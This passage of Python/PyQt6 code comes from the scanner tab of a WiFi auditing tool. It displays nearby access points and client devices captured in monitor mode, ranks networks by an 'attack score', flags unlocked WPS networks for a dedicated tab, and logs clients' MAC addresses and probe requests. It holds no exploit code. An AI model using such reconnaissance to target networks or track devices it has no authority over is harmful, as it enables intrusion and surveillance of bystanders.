                    item.setFont(i, parent_font)
            elif item in self.ap_tree_items.values():
                # AP item - make it bold
                ap_font = QFont()
                ap_font.setBold(True)
                ap_font.setPointSize(value)
                for i in range(13):
                    item.setFont(i, ap_font)
            else:
                # Client or other item - normal font
                client_font = QFont()
                client_font.setPointSize(value)
                for i in range(13):
                    item.setFont(i, client_font)

            iterator += 1

    def log(self, message: str):
        """Add message to log"""
        from datetime import datetime
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_area.append(f"[{timestamp}] {message}")

    def get_blacklist(self):
        """Get list of blacklisted BSSIDs from config"""
        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()
            blacklist_str = config.get('app.bssid_blacklist', '')

            if not blacklist_str:
                return []

            return [b.strip().upper() for b in blacklist_str.split(',') if b.strip()]

        except Exception as e:
            print(f"[!] Error getting blacklist: {e}")
            return []

    def get_show_blacklisted_setting(self):
        """Get whether to show blacklisted APs"""
        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()
            return config.get('app.show_blacklisted_aps', 'false') == 'true'

        except Exception as e:
            print(f"[!] Error getting show blacklisted setting: {e}")
            return False  # Default to hiding blacklisted APs

    def _get_monitor_interface_safe(self) -> Optional[str]:
        """
        Safely get monitor interface

        Returns cached value if available, otherwise detects from system.
        Returns None if no monitor interface found.
        """
        import subprocess

        # Return cached value if available
        if self.monitor_interface:
            return self.monitor_interface

        # Try to detect monitor interface
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=2)
            lines = result.stdout.split('\n')

            for i, line in enumerate(lines):
                if 'type monitor' in line.lower():
                    # Look backwards for Interface line
                    for j in range(i - 1, max(0, i - 5), -1):
                        if 'Interface' in lines[j]:
                            parts = lines[j].strip().split()
                            if len(parts) >= 2:
                                return parts[1]
                            break
                    break

        except Exception as e:
            print(f"[!] Error detecting monitor interface: {e}")

        return None

    def start_scan(self):
        """Start WiFi scanning"""
        if not self.monitor_interface:
            self.log("❌ ERROR: No monitor interface available")
            self.log("Please run: sudo airmon-ng start wlan0")
            from PyQt6.QtWidgets import QMessageBox
            QMessageBox.critical(
                self,
                "No Monitor Interface",
                "No monitor mode interface detected.\n\n"
                "Monitor mode must be enabled first.\n\n"
                "Run: sudo airmon-ng start wlan0"
            )
            return

        self.log("=" * 60)
        self.log(f"🚀 Starting WiFi scan on {self.monitor_interface}")
        self.log("=" * 60)

        # Clear trees to show only live data
        self.log("Clearing previous scan data...")
        self.tree_with_clients.clear()
        self.tree_without_clients.clear()
        self.ap_tree_items.clear()
        self.client_tree_items.clear()
        self.ssid_groups_with_clients.clear()
        self.ssid_groups_without_clients.clear()
        self.ssid_groups = self.ssid_groups_with_clients  # Reset backward compatibility ref
        self.unassociated_clients_group = None
        self.networks_with_clients_group = None
        self.networks_without_clients_group = None
        self.historical_aps = set()  # Track BSSIDs of historical (not yet seen live) APs
        self.ap_count_label.setText("APs: 0")
        self.client_count_label.setText("Clients: 0")
        self.log("Ready for live scanning...")

        # Load historical data immediately (no warm-up delay)
        self.log("✓ Loading historical data from database...")
        self.load_historical_data_with_markers()

        # GUI is now a viewer only - orchestrator manages the scanner
        # Start database polling to show live updates from orchestrator's scanner
        self.log("✓ Starting database polling (orchestrator manages scanning)")

        # Check if orchestrator is running
        import os
        if os.path.exists('/tmp/gattrose-status.json'):
            self.log("✓ Orchestrator detected - displaying live data")
            self.status_label.setText("Status: Live (Orchestrator)")
        else:
            self.log("⚠ Orchestrator not detected - data may be stale")
            self.status_label.setText("Status: Database View Only")

        # Start minimal stats polling timer (tree updates via real-time events)
        if not self.db_poll_timer:
            self.db_poll_timer = QTimer()
            self.db_poll_timer.timeout.connect(self.poll_database)
            self.db_poll_timer.start(3000)  # Poll every 3 seconds for responsive live updates
            self.log("✓ Live data polling started (3s interval) - Real-time updates via events")

        # Start animation timer for visual feedback
        self.scan_animation_index = 0
        self.scan_animation_timer = QTimer()
        self.scan_animation_timer.timeout.connect(self.update_scan_animation)
        self.scan_animation_timer.start(100)

        # Start signal color shift animation
        if not self.signal_color_shift_timer:
            self.signal_color_shift_timer = QTimer()
            self.signal_color_shift_timer.timeout.connect(self.update_signal_colors)
            self.signal_color_shift_timer.start(150)

        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)

    def stop_scan(self):
        """Stop WiFi scanning"""
        if self.scanner:
            self.log("Stopping scan...")
            self.scanner.stop()
            self.scanner.wait()  # Wait for thread to finish

    def update_scan_animation(self):
        """Update scanning animation frame"""
        frame = self.scan_animation_frames[self.scan_animation_index]
        self.status_label.setText(f"Status: {frame} Scanning... (Active)")
        self.scan_animation_index = (self.scan_animation_index + 1) % len(self.scan_animation_frames)

    def on_scan_started(self):
        """Handle scan started signal"""
        # Start animation timer
        self.scan_animation_index = 0
        self.scan_animation_timer = QTimer()
        self.scan_animation_timer.timeout.connect(self.update_scan_animation)
        self.scan_animation_timer.start(100)  # Update every 100ms for smooth animation
        self.update_scan_animation()  # Show first frame immediately

        # Start signal color shift animation
        if not self.signal_color_shift_timer:
            self.signal_color_shift_timer = QTimer()
            self.signal_color_shift_timer.timeout.connect(self.update_signal_colors)
            self.signal_color_shift_timer.start(150)  # Update every 150ms for smooth pulsing

        # Start minimal stats polling timer (tree updates via real-time events)
        if not self.db_poll_timer:
            self.db_poll_timer = QTimer()
            self.db_poll_timer.timeout.connect(self.poll_database)
            self.db_poll_timer.start(3000)  # Poll every 3 seconds for responsive live updates
            self.log("Live data polling started (3s) - Real-time updates via events")

    def on_scan_stopped(self):
        """Handle scan stopped signal"""
        # Stop animation timer
        if self.scan_animation_timer:
            self.scan_animation_timer.stop()
            self.scan_animation_timer = None

        # Stop signal color shift animation
        if self.signal_color_shift_timer:
            self.signal_color_shift_timer.stop()
            self.signal_color_shift_timer = None

        # Stop database polling timer
        if self.db_poll_timer:
            self.db_poll_timer.stop()
            self.db_poll_timer = None
            self.log("Database polling stopped")

        self.status_label.setText("Status: Stopped")
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)

    def update_signal_colors(self):
        """Update signal bar colors for animation"""
        from PyQt6.QtGui import QBrush, QColor

        # Increment color phase for smooth pulsing
        self.signal_color_phase = (self.signal_color_phase + 8) % 360

        # Update all AP signal bars
        for bssid, item in self.ap_tree_items.items():
            # Get current power value from column 5
            power_text = item.text(5)
            if power_text and "dBm" in power_text:
                # Re-calculate signal bars with new phase
                signal_bars, signal_color, power_value = self.get_signal_bar(power_text.replace(" dBm", ""))

                # Update SSID column (column 1) with new colored signal bars
                current_ssid_text = item.text(1)
                # Remove old signal bars (everything after last space with bar characters)
                if any(bar in current_ssid_text for bar in "▂▃▅▆█▁"):
                    # Find the last position before the bars
                    ssid_only = current_ssid_text
                    for bar_char in "▂▃▅▆█▁":
                        if bar_char in ssid_only:
                            ssid_only = ssid_only[:ssid_only.rfind(bar_char)].rstrip()
                            break
                else:
                    ssid_only = current_ssid_text

                # Set new text with updated signal bars
                item.setText(1, f"{ssid_only} {signal_bars}")
                item.setForeground(1, QBrush(QColor(signal_color)))

        # Update all client signal bars
        for mac, item in self.client_tree_items.items():
            # Get current power value from column 5
            power_text = item.text(5)
            if power_text and "dBm" in power_text:
                # Re-calculate signal bars with new phase
                signal_bars, signal_color, power_value = self.get_signal_bar(power_text.replace(" dBm", ""))

                # Update MAC column (column 0) with new colored signal bars
                current_mac_text = item.text(0)
                # Remove old signal bars
                if any(bar in current_mac_text for bar in "▂▃▅▆█▁"):
                    # Find the last position before the bars
                    mac_only = current_mac_text
                    for bar_char in "▂▃▅▆█▁":
                        if bar_char in mac_only:
                            mac_only = mac_only[:mac_only.rfind(bar_char)].rstrip()
                            break
                else:
                    mac_only = current_mac_text

                # Set new text with updated signal bars
                item.setText(0, f"{mac_only} {signal_bars}")
                item.setForeground(0, QBrush(QColor(signal_color)))

    def on_error(self, error: str):
        """Handle error from scanner"""
        self.log(f"❌ ERROR: {error}")

        # Show critical errors in dialog
        if "CSV file not created" in error or "airmon" in error.lower():
            from PyQt6.QtWidgets import QMessageBox
            QMessageBox.critical(self, "Scanner Error", f"Critical Error:\n\n{error}")

    def update_scan_warmup_countdown(self):
        """Update the scan warm-up countdown timer"""
        self.scan_warmup_countdown -= 1

        if self.scan_warmup_countdown > 0:
            self.log(f"⏱️  Loading historical data in {self.scan_warmup_countdown}s...")
        else:
            # Countdown finished - load historical data
            self.scan_warmup_timer.stop()
            self.log("✓ Warm-up complete - loading historical data...")
            self.load_historical_data_with_markers()

    def load_historical_data_with_markers(self):
        """Load historical data from database and mark it as historical"""
        try:
            # Load data from recent CSV
            self.load_recent_scan_data()

            # All loaded APs are now historical until seen in live scan
            for bssid in self.ap_tree_items.keys():
                self.historical_aps.add(bssid)

            # Update display to show historical markers
            self.mark_historical_aps_in_tree()

            self.log(f"📚 Loaded {len(self.historical_aps)} historical APs (gray = not yet seen live)")

        except Exception as e:
            self.log(f"⚠️  Error loading historical data: {e}")
            print(f"[!] Error loading historical data: {e}")

    def mark_historical_aps_in_tree(self):
        """Add visual markers to historical APs in the tree"""
        from PyQt6.QtGui import QBrush, QColor

        for bssid in self.historical_aps:
            if bssid in self.ap_tree_items:
                item = self.ap_tree_items[bssid]

                # Prepend scroll icon to BSSID column to indicate historical
                current_text = item.text(0)
                if "📜" not in current_text:
                    item.setText(0, f"📜 {current_text}")

                # Make semi-transparent with gray color (50% opacity)
                # Alpha channel: 128 = 50% transparent
                gray_semi_transparent = QColor(120, 120, 120, 128)
                gray_brush = QBrush(gray_semi_transparent)
                for col in range(13):
                    item.setForeground(col, gray_brush)

    def poll_database(self):
        """Poll database for current scan data and update GUI"""
        try:
            from ..database.models import get_session, CurrentScanNetwork, CurrentScanClient

            session = get_session()
            try:
                # Get all networks and clients from current scan (ephemeral tables)
                networks = session.query(CurrentScanNetwork).all()
                clients = session.query(CurrentScanClient).all()

                # Update counters
                ap_count = len(networks)
                client_count = len(clients)

                # Debug: Log every poll to verify it's working
                if ap_count > 0 or client_count > 0:
                    print(f"[DB-POLL] Found {ap_count} networks, {client_count} clients in database")

                if ap_count != self.last_ap_count or client_count != self.last_client_count:
                    self.ap_count_label.setText(f"APs: {ap_count}")
                    self.client_count_label.setText(f"Clients: {client_count}")
                    self.last_ap_count = ap_count
                    self.last_client_count = client_count
                    print(f"[DB-POLL] Updated GUI: {ap_count} APs, {client_count} clients")

                # Build client mapping by BSSID
                clients_by_bssid = {}
                for client in clients:
                    bssid = client.bssid
                    if bssid and bssid != "(not associated)":
                        if bssid not in clients_by_bssid:
                            clients_by_bssid[bssid] = []
                        clients_by_bssid[bssid].append(client)

                # Update networks in tree (with client info)
                for network in networks:
                    # Pass associated clients to update function
                    network_clients = clients_by_bssid.get(network.bssid, [])
                    self._update_ap_from_db(network, network_clients)

                # Update clients in tree
                for client in clients:
                    self._update_client_from_db(client)

                # Forward WPS-enabled networks to WPS Networks tab
                if hasattr(self, 'main_window') and hasattr(self.main_window, 'wps_networks_tab'):
                    wps_tab = self.main_window.wps_networks_tab
                    for network in networks:
                        if network.wps_enabled:
                            ap_data = {
                                'bssid': network.bssid,
                                'ssid': network.ssid or '',
                                'vendor': network.vendor or 'Unknown',
                                'channel': network.channel,
                                'power': network.power,
                                'wps_version': network.wps_version or '1.0',
                                'wps_locked': network.wps_locked or False,
                                'manufacturer': network.vendor or 'Unknown',
                                'model': 'Unknown',
                                'beacons': network.beacon_count or 0,
                                'attack_score': float(network.attack_score) if network.attack_score else 100.0
                            }
                            wps_tab.add_wps_network(network.bssid, ap_data)

            finally:
                session.close()

        except Exception as e:
            print(f"[!] Error polling database: {e}")
            import traceback
            traceback.print_exc()

    def poll_database_stats(self):
        """
        Lightweight stats-only polling (WPS forwarding + counters)
        Tree updates are handled by real-time event system
        """
        try:
            from ..database.models import get_session, CurrentScanNetwork, CurrentScanClient

            session = get_session()
            try:
                # Get counts only (no full tree rebuild)
                ap_count = session.query(CurrentScanNetwork).count()
                client_count = session.query(CurrentScanClient).count()

                # Update counters if changed
                if ap_count != self.last_ap_count or client_count != self.last_client_count:
                    self.ap_count_label.setText(f"APs: {ap_count}")
                    self.client_count_label.setText(f"Clients: {client_count}")
                    self.last_ap_count = ap_count
                    self.last_client_count = client_count

                # Forward WPS-enabled networks to WPS tab (batch operation)
                if hasattr(self, 'main_window') and hasattr(self.main_window, 'wps_networks_tab'):
                    wps_tab = self.main_window.wps_networks_tab
                    wps_networks = session.query(CurrentScanNetwork).filter_by(wps_enabled=True).all()

                    for network in wps_networks:
                        ap_data = {
                            'bssid': network.bssid,
                            'ssid': network.ssid or '',
                            'vendor': network.vendor or 'Unknown',
                            'channel': network.channel,
                            'power': network.power,
                            'wps_version': network.wps_version or '1.0',
                            'wps_locked': network.wps_locked or False,
                            'manufacturer': network.vendor or 'Unknown',
                            'model': 'Unknown',
                            'beacons': network.beacon_count or 0,
                            'attack_score': float(network.attack_score) if network.attack_score else 100.0
                        }
                        wps_tab.add_wps_network(network.bssid, ap_data)

            finally:
                session.close()

        except Exception as e:
            print(f"[!] Error in stats polling: {e}")
            import traceback
            traceback.print_exc()

    def _update_ap_from_db(self, network, network_clients=None):
        """Update or create AP tree item from database record

        Args:
            network: CurrentScanNetwork database record
            network_clients: List of CurrentScanClient records associated with this network
        """
        try:
            from ..tools.wifi_scanner import WiFiAccessPoint, WiFiClient

            # Convert database record to WiFiAccessPoint object for compatibility
            ap = WiFiAccessPoint(network.bssid)
            ap.ssid = network.ssid or ""
            ap.channel = str(network.channel) if network.channel else ""
            ap.encryption = network.encryption or ""
            ap.cipher = network.cipher or ""
            ap.authentication = network.authentication or ""
            ap.power = str(network.power) if network.power else ""
            ap.beacons = network.beacon_count or 0
            ap.iv = network.iv_count or 0
            ap.lan_ip = network.lan_ip or ""
            ap.speed = network.speed or ""
            ap.vendor = network.vendor or "Unknown"
            ap.device_type = network.device_type or "Unknown Device"
            ap.wps_enabled = network.wps_enabled or False
            ap.wps_locked = network.wps_locked or False
            ap.wps_version = network.wps_version or ""
            ap.attack_score = float(network.attack_score) if network.attack_score else 0.0
            ap.first_seen = network.first_seen.strftime("%Y-%m-%d %H:%M:%S") if network.first_seen else ""
            ap.last_seen = network.last_seen.strftime("%Y-%m-%d %H:%M:%S") if network.last_seen else ""

            # Calculate risk level from attack score
            if ap.attack_score >= 80:
                ap.risk_level = "CRITICAL"
            elif ap.attack_score >= 60:
                ap.risk_level = "HIGH"
            elif ap.attack_score >= 40:
                ap.risk_level = "MEDIUM"
            else:
                ap.risk_level = "LOW"

            # Set device confidence (default if not available)
            ap.device_confidence = 50  # Default confidence

            # Populate clients dict from database clients
            ap.clients = {}
            if network_clients:
                for client_record in network_clients:
                    client = WiFiClient(client_record.mac_address)
                    client.bssid = client_record.bssid or ""
                    client.power = str(client_record.power) if client_record.power else ""
                    client.packets = client_record.packets or 0
                    client.vendor = client_record.vendor or "Unknown"
                    client.device_type = client_record.device_type or "Unknown Device"
                    ap.clients[client_record.mac_address] = client

            # Check if already exists
            if network.bssid in self.ap_tree_items:
                # Update existing
                self.on_ap_updated(ap)
            else:
                # Create new
                self.on_ap_discovered(ap)

        except Exception as e:
            print(f"[!] Error updating AP from database: {e}")
            import traceback
            traceback.print_exc()

    def _update_client_from_db(self, client_record):
        """Update or create client tree item from database record"""
        try:
            from ..tools.wifi_scanner import WiFiClient

            # Convert database record to WiFiClient object for compatibility
            client = WiFiClient(client_record.mac_address)
            client.bssid = client_record.bssid or "(not associated)"
            client.power = str(client_record.power) if client_record.power else ""
            client.packets = client_record.packets or 0
            client.probed_essids = client_record.probed_essids.split(',') if client_record.probed_essids else []
            client.vendor = client_record.vendor or "Unknown"
            client.device_type = client_record.device_type or "Unknown Device"
            client.first_seen = client_record.first_seen.strftime("%Y-%m-%d %H:%M:%S") if client_record.first_seen else ""
            client.last_seen = client_record.last_seen.strftime("%Y-%m-%d %H:%M:%S") if client_record.last_seen else ""

            # Check if already exists
            if client_record.mac_address in self.client_tree_items:
                # Update existing
                self.on_client_updated(client, client.bssid)
            else:
                # Create new
                self.on_client_discovered(client, client.bssid)

        except Exception as e:
            print(f"[!] Error updating client from database: {e}")
            import traceback
            traceback.print_exc()

    def on_ap_discovered(self, ap):
        """Handle new AP discovered"""
        # Check if BSSID is blacklisted
        blacklist = self.get_blacklist()
        is_blacklisted = ap.bssid.upper() in [b.upper() for b in blacklist]

        # Check if we should show blacklisted APs
        show_blacklisted = self.get_show_blacklisted_setting()

        # If blacklisted and we're not showing them, skip this AP
        if is_blacklisted and not show_blacklisted:
            # Log but don't display
            self.log(f"⛔ BLACKLISTED (hidden): {ap.ssid or '(Hidden)'} [{ap.bssid}]")
            return  # Don't add to tree

        # Check if this was a historical AP now seen live
        was_historical = ap.bssid in self.historical_aps if hasattr(self, 'historical_aps') else False
        already_exists = ap.bssid in self.ap_tree_items

        if was_historical and already_exists:
            # Historical AP now seen live - update it to remove historical markers
            self.historical_aps.remove(ap.bssid)
            self.log(f"✓ LIVE: {ap.ssid or '(Hidden)'} [{ap.bssid}] now active (was historical)")

            # Update the existing tree item to remove historical styling
            item = self.ap_tree_items[ap.bssid]

            # Remove historical scroll icon from BSSID text
            current_text = item.text(0)
            if "📜" in current_text:
                current_text = current_text.replace("📜 ", "")
                item.setText(0, current_text)

            # Restore normal coloring (not gray)
            from src.tools.attack_scoring import AttackScorer
            r, g, b = AttackScorer.get_score_color(ap.attack_score)
            color = QColor(r, g, b)
            item.setBackground(0, QBrush(color))
            text_color = QColor(0, 0, 0) if (r + g + b) > 382 else QColor(255, 255, 255)
            item.setForeground(0, QBrush(text_color))

            # Restore normal text color for other columns
            normal_text = QColor(255, 255, 255)
            for col in range(1, 13):
                item.setForeground(col, QBrush(normal_text))

            # Save to database and return - don't create duplicate
            self.save_ap_to_database(ap)
            return

        # Log discovery
        ssid_display = ap.ssid if ap.ssid else "(Hidden)"
        wps_indicator = " [WPS]" if ap.wps_enabled else ""
        self.log(f"{ap.icon} NEW AP: {ssid_display} [{ap.bssid}] {ap.vendor} - {ap.device_type} ({ap.device_confidence}%) Score:{ap.attack_score}{wps_indicator}")

        # Save to database
        self.save_ap_to_database(ap)

        # Forward WPS-enabled networks to WPS Networks tab
        if ap.wps_enabled and hasattr(self, 'main_window') and hasattr(self.main_window, 'wps_networks_tab'):
            wps_tab = self.main_window.wps_networks_tab
            ap_data = {
                'bssid': ap.bssid,
                'ssid': ap.ssid,
                'vendor': ap.vendor,
                'channel': ap.channel,
                'power': ap.power,
                'wps_version': getattr(ap, 'wps_version', '1.0'),
                'wps_locked': ap.wps_locked,
                'manufacturer': ap.vendor,
                'model': getattr(ap, 'model_name', 'Unknown'),
                'beacons': ap.beacons,
                'attack_score': ap.attack_score
            }
            wps_tab.add_wps_network(ap.bssid, ap_data)

        # Get or create SSID group parent
        ssid_key = ap.ssid if ap.ssid else f"__hidden_{ap.bssid}"

        # Determine if this network has clients (initially assume no clients)
        # The parent will be moved if clients are detected later
        has_clients = len(ap.clients) > 0 if hasattr(ap, 'clients') else False

        # Select the appropriate tree and ssid_groups dictionary
        if has_clients:
            target_tree = self.tree_with_clients
            ssid_groups_dict = self.ssid_groups_with_clients
        else:
            target_tree = self.tree_without_clients
            ssid_groups_dict = self.ssid_groups_without_clients

        # Temporarily disable sorting for better performance
        sort_enabled = target_tree.isSortingEnabled()
        target_tree.setSortingEnabled(False)

        if ssid_key not in ssid_groups_dict:
            # Create SSID group parent at root of the appropriate tree
            parent_item = QTreeWidgetItem(target_tree)
            ssid_display = ap.ssid if ap.ssid else "(Hidden Network)"
            parent_item.setText(0, f"━━━ 📡 {ssid_display}")  # SSID with separator and icon
            parent_item.setText(1, "1 AP(s)")

            # Make parent VERY distinct - bold, larger, highlighted
            font = QFont()
            font.setBold(True)
            font.setPointSize(self.text_size_slider.value() + 2)
            for i in range(13):
                parent_item.setFont(i, font)

            # Add distinct background color for SSID groups
            from PyQt6.QtGui import QBrush, QColor
            group_color = QColor(40, 60, 100)  # Dark blue background
            for i in range(13):
                parent_item.setBackground(i, QBrush(group_color))
                parent_item.setForeground(i, QBrush(QColor(255, 255, 255)))  # White text

            parent_item.setExpanded(True)
            ssid_groups_dict[ssid_key] = parent_item

        parent_item = ssid_groups_dict[ssid_key]

        # Create tree item for AP as child of SSID group
        item = QTreeWidgetItem(parent_item)

        # Get star rating for attack score
        from src.tools.attack_scoring import AttackScorer
        stars_count, stars_str = AttackScorer.get_star_rating(ap.attack_score)

        # BSSID with stars and vendor in parentheses
        vendor_display = f" ({ap.vendor})" if ap.vendor else ""

        # Add blacklist marker if blacklisted and showing
        blacklist_marker = "⛔ " if is_blacklisted else ""
        bssid_text = f"{blacklist_marker}{stars_str} {ap.icon} {ap.bssid}{vendor_display}"
        item.setText(0, bssid_text)

        # SSID with signal bars attached
        signal_bars, signal_color, power_value = self.get_signal_bar(ap.power)
        ssid_display = ap.ssid or "(Hidden)"
        ssid_with_signal = f"{ssid_display} {signal_bars}"
        item.setText(1, ssid_with_signal)
        # Color the SSID column with signal color
        from PyQt6.QtGui import QColor, QBrush
        item.setForeground(1, QBrush(QColor(signal_color)))

        # Device type with confidence
        device_text = f"{ap.device_type} ({ap.device_confidence}%)"
        item.setText(2, device_text)  # Device Type

        # Channel with frequency
        item.setText(3, self.channel_to_frequency(ap.channel))  # Channel (Frequency)
        item.setText(4, f"{ap.encryption} {ap.cipher}")  # Encryption

        # Power column - just show dBm value
        item.setText(5, f"{power_value} dBm")

        # Attack score with risk level - display as float with 2 decimals
        item.setText(6, f"{ap.attack_score:06.2f} - {ap.risk_level}")  # Attack Score
        item.setData(6, Qt.ItemDataRole.UserRole, ap.attack_score)  # Store numeric value for sorting

        # WPS status
        wps_text = ""
        if ap.wps_enabled:
            wps_text = "LOCKED" if ap.wps_locked else "UNLOCKED"
        item.setText(7, wps_text)  # WPS

        item.setText(8, str(ap.beacons))  # Beacons
        item.setText(9, str(len(ap.clients)))  # Clients
        item.setText(10, ap.first_seen or "")  # First Seen
        item.setText(11, ap.last_seen or "")  # Last Seen

        # Apply color coding to BSSID column only (column 0)
        from PyQt6.QtGui import QBrush, QColor
        from src.tools.attack_scoring import AttackScorer

        r, g, b = AttackScorer.get_score_color(ap.attack_score)
        color = QColor(r, g, b)
        brush = QBrush(color)

        # Color only the BSSID column (column 0) for visual impact
        item.setBackground(0, brush)
        # Set text color to black or white for readability on colored background
        text_color = QColor(0, 0, 0) if (r + g + b) > 382 else QColor(255, 255, 255)
        item.setForeground(0, QBrush(text_color))

        # Style AP row (bold)
        font = QFont()
        font.setBold(True)
        font.setPointSize(self.text_size_slider.value())
        for i in range(13):
            item.setFont(i, font)

        # Store AP with uppercase BSSID for consistent lookups
        self.ap_tree_items[ap.bssid.upper()] = item

        # Update SSID group count
        if ssid_key in ssid_groups_dict:
            parent = ssid_groups_dict[ssid_key]
            ap_count = parent.childCount()
            parent.setText(1, f"{ap_count} AP(s)")

        # Re-enable sorting on the correct tree
        target_tree.setSortingEnabled(sort_enabled)

        # Update count
        self.ap_count_label.setText(f"APs: {len(self.ap_tree_items)}")

        # Save to database
        self.save_ap_to_database(ap)

    def save_ap_to_database(self, ap):
        """Save or update AP in database"""
        try:
            from src.database.models import get_session, Network
            from datetime import datetime

            session = get_session()

            # Check if network already exists
            network = session.query(Network).filter_by(bssid=ap.bssid).first()

            if network is None:
                # Create new network record
                network = Network(
                    bssid=ap.bssid,
                    ssid=ap.ssid or "",
                    encryption=ap.encryption,
                    cipher=ap.cipher,
                    channel=int(ap.channel) if ap.channel and ap.channel.isdigit() else None,
                    manufacturer=ap.vendor,
                    device_type=ap.device_type,
                    first_seen=datetime.now(),
                    wps_enabled=ap.wps_enabled,
                    wps_locked=ap.wps_locked,
                    current_attack_score=ap.attack_score,
                    highest_attack_score=ap.attack_score,
                    lowest_attack_score=ap.attack_score,
                    risk_level=ap.risk_level
                )
                session.add(network)
            else:
                # Update existing network
                if ap.ssid and not network.ssid:
                    network.ssid = ap.ssid
                network.encryption = ap.encryption
                network.cipher = ap.cipher
                if ap.channel and ap.channel.isdigit():
                    network.channel = int(ap.channel)
                network.manufacturer = ap.vendor
                network.device_type = ap.device_type
                network.last_seen = datetime.now()
                network.wps_enabled = ap.wps_enabled
                network.wps_locked = ap.wps_locked
                network.current_attack_score = ap.attack_score
                network.risk_level = ap.risk_level

                # Track highest/lowest scores
                if network.highest_attack_score is None or ap.attack_score > network.highest_attack_score:
                    network.highest_attack_score = ap.attack_score
                if network.lowest_attack_score is None or ap.attack_score < network.lowest_attack_score:
                    network.lowest_attack_score = ap.attack_score

            session.commit()
            session.close()

        except Exception as e:
            print(f"[ERROR] Failed to save AP to database: {e}")
            import traceback
            traceback.print_exc()

    def on_ap_updated(self, ap):
        """Handle AP data updated"""
        if ap.bssid in self.ap_tree_items:
            item = self.ap_tree_items[ap.bssid]

            # Get star rating for attack score
            from src.tools.attack_scoring import AttackScorer
            stars_count, stars_str = AttackScorer.get_star_rating(ap.attack_score)

            # BSSID with stars and vendor in parentheses
            vendor_display = f" ({ap.vendor})" if ap.vendor else ""
            bssid_text = f"{stars_str} {ap.icon} {ap.bssid}{vendor_display}"
            item.setText(0, bssid_text)

            # SSID with signal bars attached
            signal_bars, signal_color, power_value = self.get_signal_bar(ap.power)
            ssid_display = ap.ssid or "(Hidden)"
            ssid_with_signal = f"{ssid_display} {signal_bars}"
            item.setText(1, ssid_with_signal)
            # Color the SSID column with signal color
            from PyQt6.QtGui import QColor, QBrush
            item.setForeground(1, QBrush(QColor(signal_color)))

            item.setText(2, f"{ap.device_type} ({ap.device_confidence}%)")  # Device Type
            item.setText(3, self.channel_to_frequency(ap.channel))  # Channel (Frequency)
            item.setText(4, f"{ap.encryption} {ap.cipher}")  # Encryption

            # Power column - just show dBm value
            item.setText(5, f"{power_value} dBm")

            # Update attack score - display as float
            item.setText(6, f"{ap.attack_score:06.2f} - {ap.risk_level}")  # Attack Score
            item.setData(6, Qt.ItemDataRole.UserRole, ap.attack_score)  # Store numeric value for sorting

            # Update WPS status
            wps_text = ""
            if ap.wps_enabled:
                wps_text = "LOCKED" if ap.wps_locked else "UNLOCKED"
            item.setText(7, wps_text)  # WPS

            item.setText(8, str(ap.beacons))  # Beacons
            item.setText(9, str(len(ap.clients)))  # Clients
            item.setText(10, ap.first_seen or "")  # First Seen
            item.setText(11, ap.last_seen or "")  # Last Seen

            # Update color coding for BSSID column only (column 0)
            from PyQt6.QtGui import QBrush, QColor

            r, g, b = AttackScorer.get_score_color(ap.attack_score)
            color = QColor(r, g, b)
            brush = QBrush(color)

            # Color only the BSSID column (column 0)
            item.setBackground(0, brush)
            # Set text color to black or white for readability on colored background
            text_color = QColor(0, 0, 0) if (r + g + b) > 382 else QColor(255, 255, 255)
            item.setForeground(0, QBrush(text_color))

            # Save to database
            self.save_ap_to_database(ap)

    def on_client_discovered(self, client, bssid: str):
        """Handle new client discovered"""
        # Check if this is an unassociated client
        is_unassociated = not bssid or bssid == "(not associated)" or bssid.strip() == ""

        # Check if the associated AP is blacklisted
        if not is_unassociated:
            blacklist = self.get_blacklist()
            show_blacklisted = self.get_show_blacklisted_setting()

            # If the AP is blacklisted and we're not showing blacklisted items, skip this client
            if bssid.upper() in [b.upper() for b in blacklist] and not show_blacklisted:
                # Log but don't display
                self.log(f"⛔ BLACKLISTED CLIENT (hidden): {client.mac} → {bssid}")
                return  # Don't add to tree

        # Log discovery
        if not is_unassociated:
            self.log(f"{client.icon} NEW CLIENT: {client.mac} → {bssid} [{client.vendor} - {client.device_type} ({client.device_confidence}%)]")
        else:
            probes_str = ', '.join(client.probed_essids) if client.probed_essids else "None"
            self.log(f"{client.icon} NEW CLIENT: {client.mac} (unassociated) [{client.vendor} - {client.device_type} ({client.device_confidence}%)] - Probes: {probes_str}")

            # Forward unassociated clients to dedicated tab
            if hasattr(self, 'unassociated_clients_tab'):
                self.unassociated_clients_tab.add_client(client, bssid)

            # Don't show unassociated clients in scanner tab - they're in dedicated tab
            return

        # Check if client already exists in tree
        existing_item = self.client_tree_items.get(client.mac)

        if existing_item:
            # Update existing item instead of creating duplicate
            item = existing_item
            # Update the display values
            vendor_display = f" ({client.vendor})" if client.vendor else ""
            signal_bars, signal_color, power_value = self.get_signal_bar(client.power)
            mac_with_signal = f"{client.icon} {client.mac}{vendor_display} {signal_bars}"
            item.setText(0, mac_with_signal)
            from PyQt6.QtGui import QColor, QBrush
            item.setForeground(0, QBrush(QColor(signal_color)))

            # Update power
            item.setText(5, f"{power_value} dBm")
            # Update packets
            item.setText(8, str(client.packets))
            # Update last seen
            item.setText(11, client.last_seen or "")

            # Return early - don't recreate the item
            return

        # Find parent AP item (case-insensitive lookup)
        parent_item = self.ap_tree_items.get(bssid.upper())

        if parent_item:
            # Create child item under AP
            item = QTreeWidgetItem(parent_item)
        else:
            # Unknown AP - log warning and add to root (fallback)
            print(f"[!] WARNING: Client {client.mac} associated with unknown AP {bssid}")
            print(f"[!] Available APs in tree: {list(self.ap_tree_items.keys())[:10]}")
            item = QTreeWidgetItem(self.tree)

        # MAC with vendor and signal bars attached
        vendor_display = f" ({client.vendor})" if client.vendor else ""
        signal_bars, signal_color, power_value = self.get_signal_bar(client.power)
        mac_with_signal = f"{client.icon} {client.mac}{vendor_display} {signal_bars}"
        item.setText(0, mac_with_signal)
        # Color the MAC column with signal color
        from PyQt6.QtGui import QColor, QBrush
        item.setForeground(0, QBrush(QColor(signal_color)))

        # For unassociated clients, show probe requests in the SSID/Info column
        if is_unassociated and client.probed_essids:
            probes_display = ', '.join(client.probed_essids[:3])  # Show first 3 probes
            if len(client.probed_essids) > 3:
                probes_display += f" (+{len(client.probed_essids) - 3} more)"
            item.setText(1, f"Probing: {probes_display} {signal_bars}")
        else:
